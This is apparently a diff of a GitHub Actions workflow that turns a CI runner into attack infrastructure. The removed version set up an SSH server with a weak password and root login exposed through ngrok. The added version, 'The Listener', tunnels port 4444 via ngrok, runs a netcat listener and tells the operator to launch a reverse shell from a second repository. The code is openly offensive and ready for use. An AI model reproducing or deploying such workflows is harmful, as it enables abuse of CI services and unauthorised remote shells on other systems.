@@ -1,31 +1,21 @@
-name: CI
+name: The Listener
 
-on:
-  push:
-    branches: [ main ]
-  workflow_dispatch:
+on: [workflow_dispatch]
 
 jobs:
-  build:
+  listen:
     runs-on: ubuntu-latest
     steps:
-      - name: The Setup
-        run: |
-          echo "They thought this was a build server. They were wrong."
-          sudo apt-get update
-          sudo apt-get install -y openssh-server
-          sudo useradd -m -s /bin/bash user
-          echo "user:password" | sudo chpasswd
-          sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
-          sudo service ssh start
-
-      - name: The Escape
+      - name: Open The Tunnel
         run: |
           curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
           ngrok authtoken ${{ secrets.NGROK_AUTH_TOKEN }}
-          ngrok tcp 22 &
+          ngrok tcp 4444 &
 
-      - name: The Signal
+      - name: Listen for the Whisper
         run: |
-          sleep 10
+          sleep 10 # Give ngrok time to connect
+          echo "LISTENING POST IS LIVE. CHECK THE NGROK URL BELOW."
           curl -s http://127.0.0.1:4040/api/tunnels
+          echo "NOW, GO TO YOUR SECOND REPO AND LAUNCH THE SHELL."
+          nc -lnvp 4444
